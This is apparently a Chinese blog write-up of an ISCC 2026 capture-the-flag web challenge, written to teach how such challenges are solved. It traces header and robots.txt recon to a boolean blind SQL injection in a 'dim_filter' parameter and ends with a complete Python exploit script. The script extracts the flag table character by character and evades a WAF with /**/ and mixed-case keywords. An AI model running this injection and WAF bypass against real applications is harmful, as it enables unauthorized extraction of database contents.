---
title: 'ISCC2026社团活动统计WP'
published: 2026-06-05
description: '一道挺有意思的题'
tags: [Security]
category: note
draft: false
---

# ISCC2026 社团活动统计 WriteUp 

## Web-社团活动统计

## 解题思路

1. 进入题目环境后，是一个"校园社团活动平台"页面。发现禁用 F12和右键菜单，无法看到前端源代码，但是页面底部有关键提示：`访问核心功能需：用户代理+官方来源页+校园令牌`，导航栏标亮了""活动" 和 "管理"。

   ![image-20260514214034626](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514214034790.png)

   但是直接发HTTP请求可以拿到前端代码：

   ```
    curl.exe -s -A "Mozilla/5.0" http://39.105.213.28:8000/
   ```

   ![image-20260514222243700](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514222243778.png)

   `loadMore()` 函数调用了 `/?page=2`。

2. 查看站点根目录下是否存在 `robots.txt`。访问：`http://39.105.213.28:8000/robots.txt`，发现有泄露文件路径。

   ![image-20260514214513452](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514214513508.png)

3. 访问`http://39.105.213.28:8000/static/hint/tech_stack.txt`，有两个关键信息：

   - `User-Agent: Campus-Stat/1.0`  这个就是用户代理
   - `Referer: https://campus-stat.example.com/`  很可能就是官方来源页

   ![image-20260514214739166](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514214739229.png)

4. 还差校园令牌。看下首页源码，唯一一个动态接口就是`/?page=2`：

   ```
   function loadMore() {
       fetch('/?page=2', { method: 'GET' })
   }
   ```

   带着前两个条件访问这个接口试一下：

   ![image-20260514223617627](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514223617720.png)

   响应头里有 X-Campus-Token，这个应该就是第三个关键信息校园令牌！

5. 导航栏标亮了""活动" 和 "管理"，翻译成一些常见路由名，试下能不能访问：

   ![7dfecc1d2ba2d21a3249b148e7aa1229](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514225239583.png)

   

   ![adf23997d2e147e85938932c77d216bd](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514225324384.png)

admin说maybe start from here,先研究下这个。这里不禁用F12了，能看到源代码，但是好像没什么用：

![image-20260514230022447](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514230022525.png)

看一下activity的。看到两行关键信息：

```
 console.log("%c[Clue] Half of the truth: ISCC{Campus_Stat_A_", "color: #4CAF50; font-size: 14px;");
 console.log("%c[Hint] The target might be combined with previous clues...", "color: #2196F3; font-size: 12px;");
```

![image-20260514230511923](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514230511986.png)

首页导航栏还有一个数据统计，admin也提示stat，试一下：

![16e0e053f73e7416683448aea06cba7a](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514233914456.png)

确实能访问。试下拼成flag：ISCC{Campus_Stat_A_maybe_stat}、ISCC{Campus_Stat_A_maybe_flag{stat}。都不对。

可能是路径？

![image-20260514234435287](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260514234435350.png)

果然。那就带上那三个关键信息：

![image-20260515002622855](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260515002623011.png)

牛逼。拿到三个隐藏提示：

```
    <!-- 隐藏提示1：藏在input的title属性中 -->
    <input type="text" id="dim_filter" name="dim_filter" placeholder="输入统计维度关键词" title="该参数会作为统计结果的别名使用">
    
    <!-- 隐藏提示2：藏在不可见元素的属性中 -->
    <div class="hint-attr" data-hint="SQL语句格式为SELECT COUNT(*) AS [维度值] FROM activity"></div>

    <!-- 隐藏提示3：藏在HTML注释中 -->
    <!-- Flag存储在flag表的value字段，可通过构造条件判断字符是否正确 -->
    <!-- WAF会过滤空格和完整关键词，可用/**/替代空格，简化关键词绕过 -->
```

到这里其实已经很清晰了：

- 注入点在 `dim_filter`
- 数据库查询大致与 `SELECT COUNT(*) ... FROM activity` 有关
- flag 在 `flag` 表的 `value` 字段中
- 需要用布尔盲注方式逐位判断
- 还要绕过简单 WAF

6. 布尔盲注测试一下：

![image-20260515002733043](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260515002733164.png)

![image-20260515002756697](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260515002756811.png)

条件为真时，页面显示 ` 10`，条件为假时，页面显示 ` 0`。按理说，不管传什么字符串，查询结果都应该是固定的（比如都是 10），因为 `COUNT(*)` 统计的是 `activity` 表总行数，和别名无关。这说明后端并不是单纯把 `dim_filter` 当字符串别名，而是把它当作了一个可以影响查询结果的表达式。

7. ISCC的题flag基本都是ISCC开头，测一下：

   ![image-20260515005714745](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260515005714874.png)

再试一个错误的：

![image-20260515005810249](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260515005810369.png)

注入已经完全打通，接下来只需要逐位枚举即可。

8. 先确定flag长度，发现长度为27时是对的：

   ![image-20260515010027742](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260515010027855.png)

那就写个脚本，逐位枚举 flag。运行脚本：

![image-20260515021232088](https://cdn.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260515021232166.png)

整体利用链如下：

```
1. 访问首页，发现“活动 / 管理 / 统计”等关键词和页脚提示。
2. 访问 `/?page=2`，从响应头得到 `X-Campus-Token`。
3. 查看 `robots.txt`，拿到 `/static/hint/tech_stack.txt`。
4. 访问提示文件，获得：
   - 正确的 `User-Agent`
   - 正确的 `Referer`
5. 访问 `/admin/`、`/activity/`、`/stat/`收集碎片线索。
6. 将关键词拼接为 `/admin/stat/activity/`，进入核心统计页面。
7. 通过源码注释定位 `dim_filter` 为注入点。
8. 根据提示得知：
   - 查询骨架
   - flag 表和字段
   - WAF 绕过方式
9. 使用布尔盲注按位恢复 flag。

这题的设计属于典型的“多层提示驱动型 Web 题”：
- 第一层提示在前端页面
- 第二层提示在响应头
- 第三层提示在 `robots.txt`
- 第四层提示在隐藏路由
- 最终利用点在参数注入
```

## EXP

```
import requests
import re
import string
import time  # 加延时，防止频繁请求

base = "http://39.105.213.28:8000/admin/stat/activity/"
headers = {
    "User-Agent": "Campus-Stat/1.0",
    "Referer": "https://campus-stat.example.com/",
    "X-Campus-Token": "campus-ctf-2024-abc123",
}

charset = string.ascii_letters + string.digits + string.punctuation


def query(expr):
    try:
        # 关键：WAF 绕过 + 延时 1 秒，避免频繁请求

        time.sleep(1)

        # 最关键：大小写混合 + /**/ 绕过 WAF
        payload = expr.replace("select", "SeLeCt").replace("from", "FrOm")

        r = requests.get(base, headers=headers, params={"dim_filter": payload}, timeout=10)
        m = re.search(r'<div class="count">(.*?)</div>', r.text, re.S)
        if not m:
            return False
        return "10" in m.group(1)
    except:
        return False


# 1. 猜长度
length = None
for i in range(1, 70):
    expr = f"length((select/**/value/**/from/**/flag))={i}"
    if query(expr):
        length = i
        print("[+] flag 长度 =", length)
        break

# 2. 逐位猜 flag
flag = ""
for pos in range(1, length + 1):
    for ch in charset:
        expr = f"substr((select/**/value/**/from/**/flag),{pos},1)='{ch}'"
        if query(expr):
            flag += ch
            print(f"[+] 第 {pos} 位: {flag}")
            break

print("\n[✅] 最终 flag =", flag)
```

